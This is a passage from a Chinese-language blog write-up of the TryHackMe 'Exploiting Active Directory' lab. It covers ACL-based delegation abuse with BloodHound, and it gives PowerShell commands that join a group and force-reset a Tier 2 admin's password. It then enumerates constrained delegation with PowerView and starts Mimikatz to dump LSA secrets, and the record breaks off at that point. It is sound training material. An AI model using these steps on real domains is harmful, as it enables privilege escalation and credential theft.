<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>THM域学习ExploitingActiveDirectory | MikannseのSekai</title><meta name="author" content="Mikannse"><meta name="copyright" content="Mikannse"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Introduction该网络是 Breaching AD 和 Enumerate AD 网络的延续。 请确保先完成这些网络，然后再继续此操作。 另请注意，我们将广泛讨论 AD 对象。 如果您需要复习一下，请快速浏览一下这个房间。 现在我们已经突破了 AD 并枚举了域的结构，我们将探索可用于利用枚举中可能出现的错误配置的不同方法。 广告利用 现在我们已经进行了内部勘察并了解了 AD 结构和环境的情">
<meta property="og:type" content="article">
<meta property="og:title" content="THM域学习ExploitingActiveDirectory">
<meta property="og:url" content="http://mikannse.space/2024/04/27/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0ExploitingActiveDirectory/index.html">
<meta property="og:site_name" content="MikannseのSekai">
<meta property="og:description" content="Introduction该网络是 Breaching AD 和 Enumerate AD 网络的延续。 请确保先完成这些网络，然后再继续此操作。 另请注意，我们将广泛讨论 AD 对象。 如果您需要复习一下，请快速浏览一下这个房间。 现在我们已经突破了 AD 并枚举了域的结构，我们将探索可用于利用枚举中可能出现的错误配置的不同方法。 广告利用 现在我们已经进行了内部勘察并了解了 AD 结构和环境的情">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg">
<meta property="article:published_time" content="2024-04-27T00:58:55.000Z">
<meta property="article:modified_time" content="2024-07-14T13:01:00.383Z">
<meta property="article:author" content="Mikannse">
<meta property="article:tag" content="渗透测试">
<meta property="article:tag" content="笔记">
<meta property="article:tag" content="Domain">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg"><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="http://mikannse.space/2024/04/27/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0ExploitingActiveDirectory/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: Mikannse","link":"链接: ","source":"来源: MikannseのSekai","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'THM域学习ExploitingActiveDirectory',
  isPost: true,
  isHome: false,
  isHighlightShrink: undefined,
  isToc: true,
  postUpdate: '2024-07-14 21:01:00'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load',() => { preloader.endLoading() })

  if (true) {
    document.addEventListener('pjax:send', () => { preloader.initLoading() })
    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
  }
})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">303</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">74</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MikannseのSekai"><span class="site-name">MikannseのSekai</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">THM域学习ExploitingActiveDirectory</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-04-27T00:58:55.000Z" title="发表于 2024-04-27 08:58:55">2024-04-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-07-14T13:01:00.383Z" title="更新于 2024-07-14 21:01:00">2024-07-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E5%AE%89/">网安</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">14.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>52分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="THM域学习ExploitingActiveDirectory"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>该网络是 <a target="_blank" rel="noopener" href="https://tryhackme.com/jr/breachingad">Breaching AD</a> 和 <a target="_blank" rel="noopener" href="http://tryhackme.com/jr/adenumeration">Enumerate AD</a> 网络的延续。 请确保先完成这些网络，然后再继续此操作。 另请注意，我们将广泛讨论 AD 对象。 如果您需要复习一下，请快速浏览一下<a target="_blank" rel="noopener" href="https://tryhackme.com/jr/activedirectorybasics">这个房间。 </a>现在我们已经突破了 AD 并枚举了域的结构，我们将探索可用于利用枚举中可能出现的错误配置的不同方法。</p>
<p>广告利用</p>
<p>现在我们已经进行了内部勘察并了解了 AD 结构和环境的情况，现在是开发阶段的时候了。 此阶段利用错误配置来执行横向移动和权限升级的组合，直到我们达到执行目标的合适位置，如下图所示。 这个阶段通常与持久性相结合，以确保我们不会失去我们获得的新位置，但这将在下一个房间中介绍。 它通常还与附加枚举相结合，因为我们的新位置可能使我们能够获取有关土地情况的附加信息。</p>
<p>学习目标<br>在此网络中，我们将介绍几种可用于利用 AD 错误配置的方法。 这绝不是一个完整的列表，因为可用的方法通常是高度情境化的，并且依赖于 AD 结构和环境。 但是，我们将介绍以下利用 AD 的技术：</p>
<ul>
<li>AD 代表团</li>
<li>强制身份验证中继</li>
<li>组策略对象</li>
<li>定位广告用户</li>
<li>域名信托</li>
<li>银票和金票</li>
</ul>
<h1 id="Exploiting-Permission-Delegation"><a href="#Exploiting-Permission-Delegation" class="headerlink" title="Exploiting Permission Delegation"></a>Exploiting Permission Delegation</h1><p>Active Directory 可以通过称为“权限委派”的功能来委派权限和特权（不要与下一个任务中将讨论的 Kerberos 委派混淆）。 授权使得 AD 在组织中如此强大。 想象一下，我们为一家拥有 50000 名员工的组织工作。 由于我们关心安全性，因此我们只有三个有权访问 DA 凭据的用户。 这三个用户不可能满足用户的所有请求，例如重置密码。 使用委派，我们可以将强制更改用户密码的权限委派给帮助台团队，这意味着他们现在拥有此特定功能的委派权限。 原则上，为了保证代表团的安全，应遵循最小特权原则。 然而，在大型组织中，这说起来容易做起来难。 在此任务中，我们将研究如何利用一些委派错误配置。</p>
<p>权限委托</p>
<p>权限委托漏洞通常称为基于 ACL 的攻击。 AD 允许管理员配置访问控制条目 (ACE) 来填充自主访问控制列表 (DACL)，因此称为基于 ACL 的攻击。 几乎所有 AD 对象都可以使用 ACE 进行保护，ACE 描述任何其他 AD 对象对目标对象所具有的允许和拒绝的权限。</p>
<p>但是，如果这些 ACE 配置错误，攻击者就有可能利用它们。 让我们再看一下我们的例子。 如果 IT 支持团队通过域用户组被授予 ForceChangePassword ACE，则这将被视为不安全。 当然，他们能够重置忘记密码的员工的密码，但这种错误配置还允许他们重置特权帐户的密码，例如本质上允许权限升级的域管理员组成员的帐户。</p>
<p>利用 ACE</p>
<p>大量 ACE 可能会被错误配置，并且每种 ACE 的漏洞利用情况各不相同。 <a target="_blank" rel="noopener" href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#">Bloodhound 文档</a> 有助于解释枚举的 ACE 以及如何利用它们。 然而，我们将在这里看看几个值得注意的：</p>
<ul>
<li><strong>ForceChangePassword：</strong> 我们能够在不知道用户当前密码的情况下设置用户的当前密码。</li>
<li><strong>添加成员：</strong> 我们能够将用户（包括我们自己的帐户）、组或计算机添加到目标组。</li>
<li><strong>GenericAll：</strong> 我们对对象拥有完全的控制权，包括更改用户密码、注册 SPN 或将 AD 对象添加到目标组的能力。</li>
<li><strong>GenericWrite：</strong> 我们可以更新目标对象的任何不受保护的参数。 例如，这可以让我们更新 scriptPath 参数，这将导致用户下次登录时执行脚本。</li>
<li><strong>WriteOwner：</strong> 我们有能力更新目标对象的所有者。 我们可以让自己成为所有者，从而获得对该对象的额外权限。</li>
<li><strong>WriteDACL：</strong> 我们能够将新的 ACE 写入目标对象的 DACL。 例如，我们可以编写一个 ACE 来授予我们的帐户对目标对象的完全控制权。</li>
<li><strong>AllExtendedRights：</strong> 我们有能力对目标对象执行与扩展 AD 权限相关的任何操作。 例如，这包括强制更改用户密码的能力。</li>
</ul>
<p>为了利用这些 ACE，我们需要一种与 AD 交互的方法来发出这些请求。 两个最佳选项是 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps">AD-RSAT</a> PowerShell cmdlet 或 [PowerSploit](https: //github.com/PowerShellMafia/PowerSploit）。 根据环境中的漏洞和检测工具，一种选择可能更加隐蔽。 在此任务中，我们将展示两者。</p>
<p>寻血猎犬</p>
<p>Sharphound 已经为您执行并作为任务文件附加。 在 AttackBox 或 Kali 机器上启动 Bloodhound 并摄取数据。 不过，欢迎您按照<a target="_blank" rel="noopener" href="https://tryhackme.com/room/adenumeration">枚举 AD 房间</a> 中提供的步骤自行重新运行 Sharphound。 注意：如果您收到“无法连接到 LDAP，请验证您的凭据”，请确保您的域设置正确。 我们提供了 SharpHound 数据的 ZIP 作为任务文件。 在 AttackBox 上，您可以在“/root/Rooms/ExploitingAD/”下找到 ZIP 文件。 首先，我们需要启动 neo4j：</p>
<p> 命令提示符</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         thm@thm:~# neo4j console start</span><br><span class="line">Active database: graph.db</span><br><span class="line">Directories in use:</span><br><span class="line">  home:         /var/lib/neo4j</span><br><span class="line">  config:       /etc/neo4j</span><br><span class="line">  logs:         /var/log/neo4j</span><br><span class="line">  plugins:      /var/lib/neo4j/plugins</span><br><span class="line">  import:       /var/lib/neo4j/import</span><br><span class="line">  data:         /var/lib/neo4j/data</span><br><span class="line">  certificates: /var/lib/neo4j/certificates</span><br><span class="line">  run:          /var/run/neo4j</span><br><span class="line">Starting Neo4j.</span><br><span class="line">[....]</span><br><span class="line">2022-03-13 19:59:18.014+0000 INFO  Bolt enabled on 127.0.0.1:7687.</span><br></pre></td></tr></tbody></table></figure>

<p>在另一个终端选项卡中，运行“bloodhound –no-sandbox”。 这将向您显示身份验证 GUI：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/39f261aecedccbaf118eb2ee69d55129.png" alt="Bloodhound Login Portal"></p>
<p>neo4j 数据库的默认凭据为“neo4j:neo4j”。 使用它在 Bloodhound 中进行身份验证。 通过身份验证后，您可以将两个拉链拖放到 Bloodhound 屏幕上。 一旦数据被摄取，我们就可以再次开始枚举攻击路径。</p>
<p>权限提升</p>
<p>如果我们在 Bloodhound 中搜索任务 1 中分配的用户帐户，我们会发现我们没有很多权限。 我们能够通过 RDP 进入 THMWRK1，但这只会为我们提供低特权访问。</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/74eb0bd1b47163a36f225c01830c839f.png" alt="Bloodhound attack path"></p>
<p>由于域是分层的，我们的第一步将是破坏第 2 层基础设施。 我们需要破坏 <em>Tier 2 Admins</em> 组，因为该组在所有工作站上拥有管理权限。 让我们问问寻血猎犬是否有一条道路可以用来危害这个组织。 添加您的用户帐户作为起始位置，并将 <em>Tier 2 Admins</em> 组添加为结束位置。</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/b75142b902297d318ca720f67015788f.png" alt="Bloodhound attack path"></p>
<p>Bloodhound向我们展示了一条非常有趣的道路。 看来这个领域有一点权限委托。 管理员通过向 <em>Domain Users</em> 组提供 AddMembers ACE 错误配置了 <em>IT Support</em> 组的权限委派。 这意味着“域用户”组的任何成员（包括我们的帐户）都可以将帐户添加到“IT 支持”组。 此外，Bloodhound 显示 <em>IT 支持</em> 组拥有针对 <em>Tier 2 Admins</em> 组成员的 ForceChangePassword ACE。 这并不是真正的错误配置，因为第 2 层管理员并不那么敏感，但与最初的错误配置结合使用时，它提供了非常有效的攻击路径。 让我们利用它吧！</p>
<p>添加会员</p>
<p>此攻击路径的第一步是将我们的 AD 帐户添加到 <em>IT Support</em> 组。 为此，我们将使用 AD-RSAT 工具集中的 <strong>Add-ADGroupMember</strong> PowerShell cmdlet。 在 THMJMP1 主机上启动 PowerShell（通过 RDP 或通过 SSH）并运行以下命令来添加您的帐户：</p>
<p> PowerShell</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">PS C:\&gt;Add-ADGroupMember "IT Support" -Members "Your.AD.Account.Username"</span><br></pre></td></tr></tbody></table></figure>

<p>我们可以使用 <strong>Get-ADGroupMember</strong> cmdlet 验证该命令是否有效：</p>
<p> PowerShell</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         PS C:\&gt;Get-ADGroupMember -Identity "IT Support"</span><br><span class="line">distinguishedName : CN=hugh.jones,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC=loc</span><br><span class="line">name              : hugh.jones</span><br><span class="line">objectClass       : user</span><br><span class="line">objectGUID        : 460178d3-c818-4e28-9a39-b1ab2b0d3779</span><br><span class="line">SamAccountName    : hugh.jones</span><br><span class="line">SID               : S-1-5-21-3885271727-2693558621-2658995185-1113</span><br></pre></td></tr></tbody></table></figure>

<p>如果一切正常，您应该会以会员身份看到您的帐户。</p>
<p>强制更改密码</p>
<p>现在我们是 <em>IT Support</em> 组的成员，我们继承了 <em>Tier 2 Admins</em> 组的 ForceChangePassword 权限委托。 首先，我们需要确定该群体的成员以选择目标。 我们可以再次使用 <strong>Get-ADGroupMember</strong> cmdlet 来协助完成此操作：</p>
<p> PowerShell</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         PS C:\&gt;Get-ADGroupMember -Identity "Tier 2 Admins"</span><br><span class="line">distinguishedName : CN=t2_lawrence.lewis,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc</span><br><span class="line">name              : t2_lawrence.lewis</span><br><span class="line">objectClass       : user</span><br><span class="line">objectGUID        : 4ca61b47-93c8-44d2-987d-eca30c69d828</span><br><span class="line">SamAccountName    : t2_lawrence.lewis</span><br><span class="line">SID               : S-1-5-21-3885271727-2693558621-2658995185-1893</span><br><span class="line"></span><br><span class="line">[....]</span><br><span class="line"></span><br><span class="line">distinguishedName : CN=t2_leon.francis,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc</span><br><span class="line">name              : t2_leon.francis</span><br><span class="line">objectClass       : user</span><br><span class="line">objectGUID        : 854b6d40-d537-4986-b586-c40950e0d5f9</span><br><span class="line">SamAccountName    : t2_leon.francis</span><br><span class="line">SID               : S-1-5-21-3885271727-2693558621-2658995185-3660</span><br></pre></td></tr></tbody></table></figure>

<p>记下这些帐户之一的用户名。 <strong>由于网络是共享的，因此最好选择列表中更靠下的一个。</strong> 我们将使用 <strong>Set-ADAccountPassword</strong> AD-RSAT cmdlet 强制更改密码：</p>
<p> PowerShell</p>
<figure class="highlight shell"><figcaption><span>会话</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">          PS C:\&gt;$Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force</span><br><span class="line">PS C:\&gt;Set-ADAccountPassword -Identity "AD.Account.Username.Of.Target" -Reset -NewPassword $Password</span><br><span class="line">````</span><br><span class="line"></span><br><span class="line">**注意：如果您收到“拒绝访问”错误，则表明您的权限尚未通过域传播。 这最多可能需要 10 分钟。 最好的方法是终止 SSH 或 RDP 会话，短暂休息一下，然后重新进行身份验证并重试。 您还可以运行** `gpupdate /force` **然后断开连接并重新连接，这在某些情况下会导致同步更快。**</span><br><span class="line"></span><br><span class="line">如果此步骤有效，您现在应该能够使用此目标帐户及其新密码向 THMWRK1 进行身份验证。 您当前拥有此工作站的管理访问权限。 恭喜！ 您已通过利用权限委派将您的特权正式升级为第 2 级管理员。</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Exploiting Kerberos Delegation</span></span><br><span class="line"></span><br><span class="line">接下来，我们将了解 Kerberos 委托。 当您谈论 AD 委派时，通常讨论的是这，而不是权限委派。</span><br><span class="line"></span><br><span class="line">Kerberos 委托</span><br><span class="line"></span><br><span class="line">Kerberos 委派的实际用途是使应用程序能够访问托管在不同服务器上的资源。 例如，Web 服务器需要访问其托管的 Web 应用程序的数据库服务器上托管的 SQL 数据库。 如果没有委派，我们可能会使用 AD 服务帐户并为其提供对数据库的直接访问权限。 当在 Web 应用程序上发出请求时，服务帐户将用于对数据库进行身份验证并恢复信息。</span><br><span class="line"></span><br><span class="line">但是，我们可以允许将此服务帐户委托给 SQL Server 服务。 用户登录我们的 Web 应用程序后，服务帐户将代表该用户请求访问数据库。 这意味着用户只能访问他们拥有相关权限的数据库中的数据，而无需向服务帐户本身提供任何数据库特权或权限。</span><br><span class="line"></span><br><span class="line">受约束与无约束</span><br><span class="line"></span><br><span class="line">Kerberos 委派有两种类型。 在Kerberos Delegation的最初实现中，使用的是Unconstrained Delegation，这是最不安全的方法。 本质上，无约束委派对委派没有任何限制。 在后台，如果设置了“TRUSTED_FOR_DELEGATION”标志的用户对配置了无约束委派的主机进行身份验证，则会生成该用户帐户的票证授予票证 (TGT) 并将其存储在内存中，以便以后需要时使用。 假设攻击者可以危害启用了无约束委派的主机。 在这种情况下，他们可能会尝试强制特权帐户向主机进行身份验证，这将允许他们拦截生成的 TGT 并模拟特权服务。 如果您想查看利用无约束委派的示例，请查看[此处](https://medium.com/@riccardo.ancarani94/exploiting-unconstrained-delegation-a81eabbd6976)。</span><br><span class="line"></span><br><span class="line">为了解决无约束委派的安全缺陷，Microsoft 于 2003 年引入了约束委派。约束委派限制了帐户可以委派的服务，从而限制了帐户被泄露时的风险。 以下是可以配置委派的服务示例：</span><br><span class="line"></span><br><span class="line">- HTTP - 用于 Web 应用程序以允许使用 AD 凭据进行直通身份验证。</span><br><span class="line">- CIFS - 通用互联网文件系统用于文件共享，允许用户委派共享。</span><br><span class="line">- LDAP - 用于委托 LDAP 服务执行重置用户密码等操作。</span><br><span class="line">- 主机 - 允许主机上所有活动的帐户委派。</span><br><span class="line">- MSSQL - 允许将用户帐户委派给 SQL 服务，以对数据库进行直通身份验证。</span><br><span class="line"></span><br><span class="line">利用受约束委派通常比利用无约束委派更复杂，因为受委派帐户不能仅用于所有用途。 然而，它仍然可以用于一些强大的利用。 一个例子是，如果我们能够破坏配置了约束委派的 AD 帐户。 通过知道该帐户的明文密码甚至 NTLM 哈希值，我们可以为该帐户生成 TGT，然后使用 TGT 为任何非敏感用户帐户执行票证授予服务器 (TGS) 请求，以便访问 作为该用户的服务。 例如，想象一下模拟一个可以访问敏感数据库的帐户。</span><br><span class="line"></span><br><span class="line">基于资源的约束委派</span><br><span class="line"></span><br><span class="line">所以 Kerberos 委托实际上分为三种类型。 但这一点本身就值得一提。 Microsoft 于 2012 年推出的基于资源的约束委派 (RBCD) 再次对 Kerberos 委派提供了额外的安全限制。 RBCD 完全改变了委托模型。 服务现在指定哪些对象可以委托给它，而不是指定哪个对象可以委托给哪个服务。 这允许服务所有者控制谁可以访问它。 在我们的 Web 应用程序示例中，这意味着我们现在可以在数据库服务上指定允许 Web 服务帐户委派对其的访问，而不是指定 Web 服务帐户可以委托给数据库服务来访问数据库。</span><br><span class="line"></span><br><span class="line">假设我们有权为某个服务配置 RBCD。 这意味着我们能够为 AD 对象设置 msDS-AllowedToActOnBehalfOfOtherIdentity 属性。 我们可以使用我们有权访问的 AD 帐户的详细信息填充此属性。 现在，为了获得对该服务的访问权限，我们可以为我们控制的帐户生成一个 TGT，这将允许我们与该服务进行交互。 如果您想要 RBCD 利用的详细示例，请查看[此处](https://stealthbits.com/blog/resource-based-constrained-delegation-虐待/）。</span><br><span class="line"></span><br><span class="line">受限委托利用</span><br><span class="line"></span><br><span class="line">我们将利用约束委派来完成这项任务。 我们需要做的第一件事是枚举可用的委托。 让我们使用新的特权用户来执行网络命令。 我们可以通过运行以下命令来使用 PowerSploit 的 **Get-NetUser** cmdlet 进行此枚举：</span><br><span class="line"></span><br><span class="line"> PowerShell</span><br><span class="line"></span><br><span class="line">```shell-session</span><br><span class="line">         PS C:\&gt;Import-Module C:\Tools\PowerView.ps1 </span><br><span class="line">PS C:\&gt;Get-NetUser -TrustedToAuth</span><br></pre></td></tr></tbody></table></figure>

<p>根据此命令的输出，我们可以看到 svcIIS 帐户可以委托 THMSERVER1 上的 HTTP 和 WSMAN 服务。 您可能会认为这意味着我们只能代表模拟用户访问网站。 但是，PowerShell Remoting 也使用 HTTP 和 WSMAN 服务。 理想的选择是模拟第 1 层管理员，因为这将为我们提供对 THMSERVER1 的管理访问权限。</p>
<p>如果您要对 THMWRK1 执行正确的利用后枚举，您会发现主机上有一个服务以 svcIIS 用户身份运行。 由于我们现在拥有管理访问权限，因此我们可以使用它来转储 LSASecrets，它是 Windows 注册表配置单元的一部分，其中存储了 Windows 服务等功能的凭据。 让我们使用 <a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/security">Mimikatz</a> 转储秘密：</p>
<p> 命令提示符</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         C:\&gt; C:\Tools\mimikatz_trunk\x64\mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53</span><br><span class="line"> .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz # token::elevate</span><br><span class="line">Token Id  : 0</span><br><span class="line">User name :</span><br><span 